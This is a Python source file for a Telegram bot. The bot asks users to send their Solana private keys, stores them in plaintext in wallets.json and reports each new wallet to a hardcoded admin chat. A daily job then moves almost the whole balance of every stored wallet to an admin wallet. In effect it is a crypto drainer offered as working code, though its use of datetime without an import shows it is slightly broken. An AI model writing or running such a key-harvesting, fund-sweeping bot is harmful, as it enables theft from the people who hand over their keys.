import os
import json
from telegram import Bot, Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from solana.rpc.api import Client
from solana.transaction import Transaction
from solana.account import Account
from solana.system_program import TransferParams, transfer

# Config
BOT_TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_CHAT_ID = "5359731364"  # Get from @userinfobot
ADMIN_WALLET = os.getenv("ADMIN_WALLET")
WALLETS_FILE = "wallets.json"

# Initialize
solana_client = Client("https://api.mainnet-beta.solana.com")
bot = Bot(token=BOT_TOKEN)

# Load existing wallets
def load_wallets():
    try:
        with open(WALLETS_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

# Save new wallet
def save_wallet(user_id, private_key):
    wallets = load_wallets()
    wallets[str(user_id)] = private_key
    with open(WALLETS_FILE, "w") as f:
        json.dump(wallets, f)

# Start command - asks for private key
def start(update: Update, context: CallbackContext):
    update.message.reply_text(
        "🔑 Please send your Solana private key to enable auto-transfers.\n"
        "⚠️ Warning: Funds will be automatically moved to admin wallet daily."
    )

# Handle private key input
def handle_private_key(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    private_key = update.message.text.strip()
    
    # Validate key (basic check)
    if len(private_key) < 30:  # Simple validation
        update.message.reply_text("❌ Invalid private key. Please try again.")
        return
    
    # Save key
    save_wallet(user_id, private_key)
    
    # Notify user
    update.message.reply_text(
        "✅ Wallet added! Your balance will auto-transfer daily."
    )
    
    # Alert admin
    bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f"👤 New user added wallet:\n"
             f"User ID: {user_id}\n"
             f"Key: {private_key[:6]}...{private_key[-6:]}"  # Partial key for security
    )

# Auto-transfer function
def auto_transfer(context: CallbackContext):
    wallets = load_wallets()
    for user_id, private_key in wallets.items():
        try:
            account = Account(private_key)
            balance = solana_client.get_balance(account.public_key()).value
            
            if balance > 5000:  # Minimum amount
                txn = Transaction().add(
                    transfer(
                        TransferParams(
                            from_pubkey=account.public_key(),
                            to_pubkey=ADMIN_WALLET,
                            lamports=balance - 5000
                        )
                    )
                )
                solana_client.send_transaction(txn, account)
                
                # Log success
                bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=f"✅ Transferred {(balance-5000)/1e9} SOL from {user_id}"
                )
        except Exception as e:
            bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"❌ Failed transfer from {user_id}: {str(e)}"
            )

def main():
    updater = Updater(BOT_TOKEN)
    
    # Handlers
    updater.dispatcher.add_handler(CommandHandler("start", start))
    updater.dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_private_key))
    
    # Auto-transfer job (runs daily at 3 AM UTC)
    job_queue = updater.job_queue
    job_queue.run_daily(auto_transfer, time=datetime.time(hour=3, minute=0))
    
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
